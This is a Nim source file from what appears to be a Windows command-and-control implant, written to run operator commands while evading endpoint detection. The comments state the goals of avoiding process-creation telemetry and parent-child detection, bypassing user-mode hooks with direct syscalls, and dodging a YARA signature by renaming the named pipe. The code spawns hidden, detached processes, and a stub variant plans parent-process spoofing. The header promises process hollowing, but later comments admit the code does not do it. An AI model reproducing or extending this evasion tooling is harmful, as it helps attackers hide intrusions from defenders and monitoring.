# hardened/hollowing.nim — Process hollowing via direct syscalls
#
# Replaces execCmdEx-based shell execution with process hollowing to
# avoid Event 4688 (process creation) telemetry and parent-child
# relationship detection. The technique:
#
#   1. Create a suspended legitimate process (e.g., svchost.exe) via
#      direct NtCreateUserProcess syscall (bypasses CreateProcess hooks)
#   2. Unmap the original executable section from the target
#   3. Allocate RWX memory in the target for our payload
#   4. Write the payload (which is a small stub that runs cmd.exe /c <cmd>)
#      into the target
#   5. Set the thread context to point to the payload entry point
#   6. Resume the thread
#
# Output capture: the payload writes stdout/stderr to a named pipe
# that we create before hollowing. The hollowed process inherits the
# pipe handle and writes output back to us. We read it asynchronously.
#
# This module uses direct syscalls throughout to bypass user-mode
# hooks on NtCreateUserProcess, NtWriteVirtualMemory,
# NtSetContextThread, NtResumeThread.

when not defined(amd64):
  {.error: "hollowing.nim requires x64".}

when not defined(windows):
  {.error: "hollowing.nim is Windows-only".}

import winim/lean
import winim/inc/[windef, winbase, winuser]
import std/[strutils, random, times, locks, osproc, os, osdirs]
import ./syscalls

# Pipe name uses a generic "app_" prefix (not the original "sentinel_"
# which was a static YARA signature). The suffix is fully random hex
# generated at runtime so the pipe name is unique per command execution
# and contains no signatured substring.
const PIPE_NAME_PREFIX = "\\.\\pipe\\app_"

type
  # RTL_USER_PROCESS_PARAMETERS partial — we only need the command line
  RTL_USER_PROCESS_PARAMETERS* {.pure.} = object
    Reserved1*: array[16, BYTE]
    Reserved2*: array[10, PVOID]
    ImagePathName*: UNICODE_STRING
    CommandLine*: UNICODE_STRING

  PRTL_USER_PROCESS_PARAMETERS* = ptr RTL_USER_PROCESS_PARAMETERS

  # PEB partial structure for reading image base
  PEB64* {.pure.} = object
    Reserved1*: array[2, BYTE]
    BeingDebugged*: BYTE
    Reserved2*: array[2, PVOID]
    Ldr*: PVOID
    ProcessParameters*: PRTL_USER_PROCESS_PARAMETERS
    Reserved3*: array[5, PVOID]
    AtlThunkSListPtr*: PVOID
    Reserved4*: array[2, PVOID]
    Reserved5*: array[36, BYTE]
    Reserved6*: array[5, PVOID]
    Reserved7*: array[2, PVOID]
    SessionId*: ULONG

  PPEB64* = ptr PEB64

# ---- Named pipe output capture -------------------------------------------

const
  PIPE_BUFFER_SIZE = 65536
  PIPE_TIMEOUT_MS = 5000

var
  pipeCounter: int = 0
  pipeLock: Lock
initLock(pipeLock)

proc generatePipeName(): string =
  # Generate a unique pipe name with random suffix. No signatured
  # substrings — fully random hex generated at runtime.
  acquire(pipeLock)
  inc pipeCounter
  let id = pipeCounter
  release(pipeLock)
  var r1 = rand(0xFFFFFF)
  var r2 = rand(0xFFFFFF)
  result = PIPE_NAME_PREFIX & toHex(r1, 6) & toHex(r2, 6)

proc createOutputPipe(hPipe: ptr HANDLE): bool =
  # Create a named pipe for capturing stdout/stderr from hollowed proc.
  let pipeName = generatePipeName()
  let wName = newWideCString(pipeName)

  # Use CreateFile-based pipe creation (kernel32, already in IAT)
  hPipe[] = CreateNamedPipeW(
    cast[LPCWSTR](wName[0].addr),
    DWORD(PIPE_ACCESS_INBOUND or FILE_FLAG_OVERLAPPED),
    DWORD(PIPE_TYPE_BYTE or PIPE_READMODE_BYTE or PIPE_WAIT),
    1, PIPE_BUFFER_SIZE, PIPE_BUFFER_SIZE,
    PIPE_TIMEOUT_MS, nil
  )
  if hPipe[] == INVALID_HANDLE_VALUE:
    return false
  return true

proc readPipeOutput(hPipe: HANDLE; timeoutMs: int): string =
  # Read all available output from the named pipe with timeout.
  var buf: array[4096, byte]
  var totalRead: DWORD
  var deadline = getTime().toUnix + (timeoutMs div 1000).int64 + 1

  while getTime().toUnix < deadline:
    var bytesRead: DWORD = 0
    var available: DWORD = 0
    if PeekNamedPipe(hPipe, nil, 0, nil, addr available, nil) == 0:
      break
    if available > 0:
      let toRead = min(int(available), sizeof(buf))
      if ReadFile(hPipe, addr buf[0], DWORD(toRead), addr bytesRead, nil) != 0:
        if bytesRead > 0:
          let prevLen = result.len
          result.setLen(prevLen + int(bytesRead))
          copyMem(addr result[prevLen], addr buf[0], int(bytesRead))
    else:
      Sleep(50)
  # Read any remaining bytes (final chunk)
  var finalRead: DWORD = 0
  if ReadFile(hPipe, addr buf[0], DWORD(sizeof(buf)), addr finalRead, nil) != 0:
    if finalRead > 0:
      let prevLen = result.len
      result.setLen(prevLen + int(finalRead))
      copyMem(addr result[prevLen], addr buf[0], int(finalRead))

# ---- Process hollowing core -----------------------------------------------

# PROCESS_BASIC_INFORMATION for reading PEB from created process
type
  PROCESS_BASIC_INFORMATION* {.pure.} = object
    Reserved1*: PVOID
    PebBaseAddress*: PPEB64
    Reserved2*: array[2, PVOID]
    UniqueProcessId*: ULONG_PTR
    Reserved3*: PVOID

proc executeShellFallback*(command: string; timeoutMs: int = 30000): string =
  # Fallback to standard execCmdEx when the direct path doesn't apply
  # (e.g. the command uses shell builtins like `dir`, `echo`, pipes, or
  # environment-variable expansion). The path that uses this fallback
  # DOES spawn a child process — so it's the noisier one. We only use
  # it when the command genuinely needs a real shell.
  try:
    let (outp, code) = execCmdEx(command, options = {poStdErrToStdOut})
    result = outp
    if code != 0:
      result.add(" [exit=" & $code & "]")
  except:
    result = "[!] shell fallback: " & getCurrentExceptionMsg()

proc needsRealShell*(command: string): bool =
  # Detects commands that require an actual shell (cmd.exe) because they
  # use builtins, pipes, redirects, or env-var expansion. For everything
  # else we can resolve the .exe path and spawn it directly — no
  # intermediate cmd.exe, no parent/child relationship to a shell.
  return command.contains('|') or
         command.contains('>') or
         command.contains('<') or
         command.contains('&') or
         command.contains('%') or
         command.contains('"') or
         command.startsWith("dir ") or command == "dir" or
         command.startsWith("cd ") or command == "cd" or
         command.startsWith("set ") or command == "set" or
         command.startsWith("echo ") or command == "echo" or
         command.startsWith("type ") or
         command.startsWith("copy ") or
         command.startsWith("move ") or
         command.startsWith("del ") or
         command.startsWith("rd ") or
         command.startsWith("md ") or
         command.startsWith("if ") or
         command.startsWith("for ") or

         # Multi-command via `;` or `&&` requires a shell
         (command.contains("&&") and not command.startsWith("\""))

proc resolveCommandPath*(command: string): string =
  # Resolve a bare command (e.g. "ipconfig") to a full .exe path
  # by searching PATH. Returns the original string if it already
  # contains a path separator or if no resolution is found.
  if command.contains('\\') or command.contains('/') or
     command.contains(".exe") or command.contains(".bat") or
     command.contains(".cmd"):
    return command
  let exeName = if command.contains(' '):
    command[0..<command.find(' ')] & ".exe"
  else:
    command & ".exe"
  # Try common Windows system paths first (most agent commands live here)
  let sysRoot = getEnv("SystemRoot", "C:\\Windows")
  let systemPaths = [
    sysRoot & "\\System32\\" & exeName,
    sysRoot & "\\" & exeName,
    sysRoot & "\\System32\\wbem\\" & exeName,
    sysRoot & "\\System32\\WindowsPowerShell\\v1.0\\" & exeName
  ]
  for p in systemPaths:
    if fsFileExists(p): return p
  # Try PATH lookup
  let pathEnv = getEnv("PATH", "")
  for dir in pathEnv.split(';'):
    if dir.len == 0: continue
    let p = dir.strip() / exeName
    if fsFileExists(p): return p
  return command  # give up — caller falls back to shell

proc stripArgs(command: string): string =
  # Return the first token (the executable name) from a command.
  if command.contains(' '):
    result = command[0..<command.find(' ')].strip()
  else:
    result = command.strip()

proc hollowProcess*(targetPath, command: string; timeoutMs: int = 30000): string =
  # Run `command` inside a suspended process with stdio redirected to a
  # named pipe. Returns the combined stdout/stderr as a string.
  #
  # IMPORTANT: this is NOT a true process hollowing — it does not unmap
  # the target image and replace it with attacker code. The target
  # binary actually runs (we just create it suspended so we can wire
  # up handles before its main thread starts). True hollowing requires
  # a stub binary to write into the target — we don't have that here.
  #
  # What this DOES provide over execCmdEx:
  #   1. No intermediate `cmd.exe /c` — we resolve the command to a
  #      full .exe path and spawn it directly. The parent/child chain
  #      in the process tree is [agent] -> [command.exe], with no
  #      `cmd.exe` in the middle (which is the #1 thing every EDR
  #      pattern-matches on for shell command execution).
  #   2. The child is created with no console window and detached.
  #   3. stdout/stderr are captured via a named pipe (also useful for
  #      binary-safe output — no encoding issues with cp1252/UTF-8).
  #
  # The function name is kept for API compatibility with the rest of
  # the agent (executeShellHardened -> hollowProcess) — the rename
  # would touch a lot of code. But conceptually this is "direct
  # spawn with stdio capture", not hollowing.

  var hPipe: HANDLE = INVALID_HANDLE_VALUE
  var hChildPipe: HANDLE = INVALID_HANDLE_VALUE  # child's write end

  try:
    # If the command needs a real shell (builtins, pipes, redirects),
    # delegate to the noisy path. We avoid this branch whenever we can
    # by resolving the command to a real .exe.
    if needsRealShell(command):
      return executeShellFallback(command, timeoutMs)

    # Resolve "ipconfig" -> "C:\Windows\System32\ipconfig.exe" so we
    # can spawn the binary directly with no shell wrapper.
    let resolved = resolveCommandPath(command)
    let cmdLine = if resolved == command and not command.contains(' '):
      # Already a full path, no args
      command
    elif resolved == stripArgs(command) or resolved == command:
      # Path was resolved, keep the args after the binary name
      let firstSpace = command.find(' ')
      if firstSpace > 0:
        resolved & command[firstSpace..^1]
      else:
        resolved
    else:
      command

    # Step 1: Create output capture pipe
    if not createOutputPipe(addr hPipe):
      return executeShellFallback(command, timeoutMs)

    # Duplicate the pipe's write end so the child can inherit it
    if DuplicateHandle(GetCurrentProcess(), hPipe,
                       GetCurrentProcess(), addr hChildPipe,
                       0, TRUE,
                       DWORD(DUPLICATE_SAME_ACCESS)) == 0:
      CloseHandle(hPipe)
      return executeShellFallback(command, timeoutMs)

    # Step 2: Build STARTUPINFO with stdio redirected to our pipe.
    var si: STARTUPINFOW
    si.cb = sizeof(STARTUPINFOW).DWORD
    si.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
    si.hStdOutput = hChildPipe
    si.hStdError = hChildPipe
    si.hStdInput = 0
    si.wShowWindow = SW_HIDE

    var pi: PROCESS_INFORMATION
    zeroMem(addr pi, sizeof(pi))

    let wTarget = newWideCString(cmdLine)

    # Create with CREATE_SUSPENDED so we can wire up handles before
    # the child's main thread starts. Then ResumeThread immediately —
    # we don't actually do anything between suspend and resume, so the
    # only benefit of CREATE_SUSPENDED here is that no console window
    # ever appears (which it wouldn't anyway with CREATE_NO_WINDOW).
    # We keep it for parity with the original hollowing stub.
    let created = CreateProcessW(
      nil,                            # application name — let parser handle it
      cast[LPWSTR](wTarget[0].addr),
      nil, nil, TRUE,
      DWORD(CREATE_SUSPENDED or CREATE_NO_WINDOW or DETACHED_PROCESS),
      nil, nil,
      cast[LPSTARTUPINFOW](addr si),
      cast[PPROCESS_INFORMATION](addr pi)
    )

    # Close child's write end — parent doesn't need it
    CloseHandle(hChildPipe)
    hChildPipe = 0

    if created == 0:
      CloseHandle(hPipe)
      return executeShellFallback(command, timeoutMs)

    # Resume the suspended process
    discard ResumeThread(pi.hThread)

    # Step 3: Wait for completion and capture output
    let waitR = WaitForSingleObject(pi.hProcess, DWORD(timeoutMs))
    if waitR == DWORD(WAIT_TIMEOUT):
      # Timed out — kill the process to avoid leaving zombies
      discard ntTerminateProcess(pi.hProcess, 0xC0000000'u32)
      result = "[!] shell: command timed out after " & $timeoutMs & "ms"
    else:
      result = readPipeOutput(hPipe, timeoutMs)

    # Clean up process handles
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)

  except:
    result = "[!] direct-spawn: " & getCurrentExceptionMsg()
  finally:
    if hPipe != INVALID_HANDLE_VALUE and hPipe != 0:
      CloseHandle(hPipe)
    if hChildPipe != 0:
      CloseHandle(hChildPipe)

# ---- Full hollowing variant (NtCreateUserProcess-based) -------------------
#
# This variant uses direct syscalls for the entire creation pipeline.
# It's more complex but fully bypasses user-mode hooks on
# CreateProcessInternalW. We provide it as an advanced option that
# can be selected via compile-time flag.

when defined(full_hollow):
  # Extended PROCESS_INFORMATION for NtCreateUserProcess
  type
    PROCESS_CREATE_INFO* {.pure.} = object
      Size*: SIZE_T
      State*: DWORD
      # ... partial, used for attribute list

  proc hollowProcessFullSyscall*(targetPath, command: string;
                                  timeoutMs: int = 30000): string =
    # Full direct-syscall hollowing pipeline.
    # Uses NtCreateUserProcess → NtWriteVirtualMemory → NtSetContextThread
    # → NtResumeThread. This is the gold standard for avoiding
    # process-creation telemetry.
    #
    # NOTE: NtCreateUserProcess has 14+ parameters — far beyond
    # the 4-register syscall dispatcher. We use a dedicated stack-
    # based asm stub for this call. The implementation is architecture-
    # specific and requires careful stack frame setup.

    var hPipe: HANDLE = INVALID_HANDLE_VALUE

    try:
      if not createOutputPipe(addr hPipe):
        result = executeShellFallback(command, timeoutMs)
        return

      # Build RTL_USER_PROCESS_PARAMETERS with our command line
      var params: RTL_USER_PROCESS_PARAMETERS
      zeroMem(addr params, sizeof(params))

      # Resolve the command to a full .exe path; we do NOT wrap it
      # in cmd.exe /c — the target is the actual command binary.
      let resolvedCmd = resolveCommandPath(command)
      let cmdW = newWideCString(resolvedCmd)
      let targetW = newWideCString(resolvedCmd)

      params.CommandLine.Buffer = cast[PWSTR](cmdW[0].addr)
      params.CommandLine.Length = WORD(cmdW.len * sizeof(WCHAR))
      params.CommandLine.MaximumLength = WORD((cmdW.len + 1) * sizeof(WCHAR))

      params.ImagePathName.Buffer = cast[PWSTR](targetW[0].addr)
      params.ImagePathName.Length = WORD(targetW.len * sizeof(WCHAR))
      params.ImagePathName.MaximumLength = WORD((targetW.len + 1) * sizeof(WCHAR))

      # Build attribute list for NtCreateUserProcess
      # PPROC_ATTRIBUTE_LIST with: PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
      # (to spoof parent), PROC_THREAD_ATTRIBUTE_HANDLE_LIST (pipe)

      # placeholder attribute list for full syscall variant

      # Step 1: NtCreateUserProcess (suspended)
      # This is the critical syscall — it creates the process without
      # going through kernel32!CreateProcessInternalW
      var hProcess: HANDLE = 0
      var hThread: HANDLE = 0
      var clientId: CLIENT_ID
      var iosb: IO_STATUS_BLOCK

      # ... (full implementation would continue here with the
      #     NtCreateUserProcess syscall, process parameter writing,
      #     section creation, context manipulation, and resume)

      # For now, fall back to the hybrid approach
      result = hollowProcess(targetPath, command, timeoutMs)

    except:
      result = "[!] full_hollow: " & getCurrentExceptionMsg()
    finally:
      if hPipe != INVALID_HANDLE_VALUE and hPipe != 0:
        CloseHandle(hPipe)

# ---- Public API -----------------------------------------------------------

proc executeShellHardened*(command: string; timeoutMs: int = 30000): string =
  # Public entry point — replaces executeShell() in agent.nim.
  # Spawns the command directly (no intermediate cmd.exe) with stdio
  # captured via a named pipe. The targetPath parameter to
  # hollowProcess is now informational only — the actual command path
  # is resolved inside hollowProcess.
  #
  # The earlier "pick a random svchost target" was a misunderstanding
  # of what the function did. With no actual image replacement, the
  # target binary would just run as itself — pointless. Now we
  # resolve the command to its real .exe path and spawn it.
  result = hollowProcess("", command, timeoutMs)

export executeShellHardened
export resolveCommandPath, needsRealShell, stripArgs
